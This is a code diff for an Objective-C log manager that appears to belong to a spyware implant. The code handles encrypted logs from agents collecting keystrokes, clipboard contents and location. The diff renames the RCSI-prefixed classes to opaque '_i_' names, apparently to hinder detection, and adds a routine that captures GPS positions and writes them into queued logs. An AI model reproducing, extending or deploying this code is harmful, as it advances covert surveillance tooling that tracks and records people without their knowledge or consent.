@@ -14,15 +14,16 @@
  *
  */
 
-#import "RCSILogManager.h"
-#import "RCSIEncryption.h"
-
 #import <CommonCrypto/CommonDigest.h>
 #import <mach/message.h>
 
+#import "RCSILogManager.h"
+#import "RCSIEncryption.h"
+#import "RCSIGlobals.h"
+
 //#define DEBUG_
 
-static RCSILogManager *sharedLogManager = nil;
+static _i_LogManager *sharedInstance = nil;
 
 #pragma mark -
 #pragma mark Log File Header Struct Definition
@@ -44,7 +45,7 @@ typedef struct _log {
   u_int additionalDataLength; // Size of additional data if present
 } logStruct;
 
-@implementation RCSILogManager
+@implementation _i_LogManager
 
 @synthesize notificationPort;
 
@@ -52,11 +53,11 @@ typedef struct _log {
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSILogManager *)sharedInstance
++ (_i_LogManager *)sharedInstance
 {
   @synchronized(self)
   {
-    if (sharedLogManager == nil)
+    if (sharedInstance == nil)
       {
         //
         // Assignment is not done here
@@ -65,21 +66,21 @@ typedef struct _log {
       }
   }
   
-  return sharedLogManager;
+  return sharedInstance;
 }
 
 + (id)allocWithZone: (NSZone *)aZone
 {
   @synchronized(self)
   {
-    if (sharedLogManager == nil)
+    if (sharedInstance == nil)
       {
-        sharedLogManager = [super allocWithZone: aZone];
+        sharedInstance = [super allocWithZone: aZone];
         
         //
         // Assignment and return on first allocation
         //
-        return sharedLogManager;
+        return sharedInstance;
       }
   }
   
@@ -98,7 +99,7 @@ typedef struct _log {
   
   @synchronized(myClass)
     {
-      if (sharedLogManager != nil)
+      if (sharedInstance != nil)
         {
           self = [super init];
           
@@ -118,15 +119,15 @@ typedef struct _log {
               NSData *temp = [NSData dataWithBytes: gLogAesKey
                                             length: CC_MD5_DIGEST_LENGTH];
 #endif
-              mEncryption = [[RCSIEncryption alloc] initWithKey: temp];
+              mEncryption = [[_i_Encryption alloc] initWithKey: temp];
               mLogMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
             }
           
-          sharedLogManager = self;
+          sharedInstance = self;
         }
     }
   
-  return sharedLogManager;
+  return sharedInstance;
 }
 
 - (id)retain
@@ -154,7 +155,7 @@ typedef struct _log {
 #pragma mark Logging facilities
 #pragma mark -
 
-- (NSMutableArray*)getLogQueue: (u_int)agentID
+- (NSMutableArray*)getLogQueue: (u_int)agentID andLogID:(u_int)logID
 {
   NSMutableArray *aQueue = mAutoQueuedLogs;
  
@@ -172,6 +173,12 @@ typedef struct _log {
     case LOG_CLIPBOARD:
       aQueue = mNoAutoQueuedLogs;
       break;
+    case LOGTYPE_LOCATION_NEW:
+      if(logID == LOGTYPE_LOCATION_GPS)
+        aQueue = mNoAutoQueuedLogs;
+      else if (logID == LOGTYPE_LOCATION_WIFI)
+        aQueue = mAutoQueuedLogs;
+    break;
   }
 
   return aQueue;
@@ -384,7 +391,7 @@ typedef struct _log {
             
           [logHeader release];
           
-          NSMutableArray *theQueue = [self getLogQueue:agentID];
+          NSMutableArray *theQueue = [self getLogQueue:agentID andLogID: logID];
           
           @synchronized(theQueue) 
           {
@@ -459,7 +466,7 @@ typedef struct _log {
   NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                      length: sizeof(int)];
               
-  NSMutableArray *theQueue = [self getLogQueue:agentID];
+  NSMutableArray *theQueue = [self getLogQueue:agentID andLogID:logID];
                                                                                                                 
   @synchronized(theQueue)
   {
@@ -502,7 +509,7 @@ typedef struct _log {
   id anObject  = nil;
   id logObject = nil;
   
-  NSMutableArray *theQueue = [self getLogQueue:agentID];
+  NSMutableArray *theQueue = [self getLogQueue:agentID andLogID:logID];
 
   @synchronized(theQueue)
   {
@@ -622,6 +629,34 @@ typedef struct _log {
 }
 
 #define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))
+  
+- (BOOL)createAndWritePositionLog:(NSData*)aData
+{
+  BOOL retVal = TRUE;
+  
+  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
+  
+  NSData *additionalData = [NSData dataWithBytes:shMemLog->commandData 
+                                          length: sizeof(LocationAdditionalData)];
+  NSData *payload        = [NSData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
+                                          length:sizeof(GPSInfo)];
+  if ([self createLog:shMemLog->agentID 
+          agentHeader:additionalData 
+            withLogID:shMemLog->logID])
+    {
+   
+      if ([self writeDataToLog:(NSMutableData*)payload 
+                  forAgent:shMemLog->agentID
+                 withLogID:shMemLog->logID] == FALSE)
+        {
+          retVal = FALSE;
+        }
+    }
+  else
+    return retVal = FALSE;
+  
+  return retVal;
+}
 
 - (BOOL)processNewLog:(NSData *)aData
 {
@@ -649,6 +684,11 @@ typedef struct _log {
                                           length: shMemLog->commandDataSize - off];
         }
     }
+  else if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
+    {
+      payload = [NSMutableData dataWithBytes:shMemLog->commandData + sizeof(LocationAdditionalData) 
+                                      length:sizeof(GPSInfo)];
+    }
   else
     {
       payload = [NSMutableData dataWithBytes: shMemLog->commandData
@@ -675,9 +715,13 @@ typedef struct _log {
                       forAgent: shMemLog->agentID
                      withLogID: shMemLog->logID] == FALSE)
         {
-          if ([self createLog:shMemLog->agentID 
-                  agentHeader:nil 
-                    withLogID:shMemLog->logID])
+          if (shMemLog->agentID == LOGTYPE_LOCATION_NEW && shMemLog->logID == LOGTYPE_LOCATION_GPS)
+            {
+              [self createAndWritePositionLog: aData];                                                                                   
+            }
+          else if ([self createLog:shMemLog->agentID 
+                       agentHeader:nil 
+                         withLogID:shMemLog->logID])
             {
               // if streaming keylog is closed rewrite with header
               if (shMemLog->agentID == LOG_KEYLOG)
@@ -787,7 +831,7 @@ NSString *kRunLoopLogManagerMode = @"kRunLoopLogManagerMode";
   [logManagerRunLoop addPort: notificationPort 
                      forMode: kRunLoopLogManagerMode];
   
-  // run the log loop: RCSICore send notification to this
+  // run the log loop: _i_Core send notification to this
   // this thread won't be never stopped...
   while (TRUE)
   {
